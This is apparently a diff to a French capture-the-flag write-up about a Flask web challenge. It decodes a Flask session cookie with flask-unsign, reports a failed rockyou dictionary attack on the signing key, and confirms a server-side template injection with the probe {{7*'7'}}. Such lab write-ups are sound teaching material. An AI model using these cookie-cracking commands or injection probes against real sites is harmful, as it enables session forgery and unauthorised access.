@@ -18,15 +18,37 @@ p.s. Pour vous faire gagner du temps, n'essayez pas d'obtenir un reverse shell
 
 ***
 
-![image](https://user-images.githubusercontent.com/49941629/166097674-23a7b22f-8e3e-45e4-b726-d430b5997f4a.png)
+En se connectant au site, on peut apercevoir que le cookie de session est un cookie Flask :
 
-Cookie Flask
-`.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q"`
+```
+.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q
+```
 
-`flask-unsign --unsign --cookie ".eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q" --wordlist ~/rockyou.txt --no-lit
-eral-eval`
+Je commence par décoder le cookie avec **flask-unsign** :
 
-{{7*'7'}} = 7777777
+```
+flask-unsign --decode --cookie 'eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q'
+```
+
+Valeur du cookie :
+
+```
+{'_fresh': True, '_id': 'ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827', '_user_id': '2'}
+```
+
+On peut constater que la valeur `'_user_id'` est à 2.
+Il est fort probable que la valeur 1 soit le compte administrateur.
+
+J'essaye par la suite de bruteforce le cookie par attaque de dictionnaire mais non-concluant :
+
+```
+flask-unsign --unsign --cookie ".eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q" --wordlist ~/rockyou.txt --no-lit
+eral-eval
+```
+
+Il nous manque la clé pour signer notre cookie Flask, je décide donc de regarder côté serveur web pour récupérer cette valeur.
+
+Sur la page d'envois de message, je remarque qu'une faille SSTI (Server Side Template Injection) est exploitable grâce à un simple payload : `{{7*'7'}}`
 
 ![image](https://user-images.githubusercontent.com/49941629/166097821-b3fa5a63-abac-40f1-bfe5-00b2e5cae5ab.png)
 
